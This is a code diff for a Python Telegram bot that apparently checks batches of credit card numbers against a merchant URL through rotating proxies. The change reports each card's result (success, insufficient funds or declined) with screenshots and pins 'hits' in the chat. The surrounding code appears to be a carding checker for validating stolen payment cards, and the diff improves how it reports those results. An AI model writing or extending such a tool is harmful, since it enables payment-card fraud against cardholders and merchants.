@@ -275,17 +275,24 @@ def run_check(chat_id, url, proxy_list, ccs_override=None):
     for i, f in enumerate(futures, 1):
         cc, res = f.result()
         record_result(cc, res)
-        # live hit -> separate photo message (pinned)
+        # screenshot for hits (pinned) and for insufficient/declined (for proof)
+        send_shot = False
+        pin_shot = False
         if res["status"] == "success":
+            send_shot, pin_shot = True, True
+        elif res["status"] in ("insufficient", "declined"):
+            send_shot = True
+        if send_shot and res.get("screenshot") and os.path.exists(res["screenshot"]):
+            cap = (f"{icon.get(res['status'],'ℹ️')} `…{res['last4']}` "
+                   f"{res['status'].upper()}\n{res['response'][:600]}")
             try:
                 with open(res["screenshot"], "rb") as ph:
-                    msg = bot.send_photo(
-                        chat_id, ph,
-                        caption=f"✅ HIT `…{res['last4']}`\n{res['response'][:600]}")
-                try:
-                    bot.pin_chat_message(chat_id, msg.message_id)
-                except Exception:
-                    pass
+                    msg = bot.send_photo(chat_id, ph, caption=cap)
+                if pin_shot:
+                    try:
+                        bot.pin_chat_message(chat_id, msg.message_id)
+                    except Exception:
+                        pass
             except Exception as e:
                 bot.send_message(chat_id, f"⚠️ shot err: {e}")
         # full diagnostic for failures
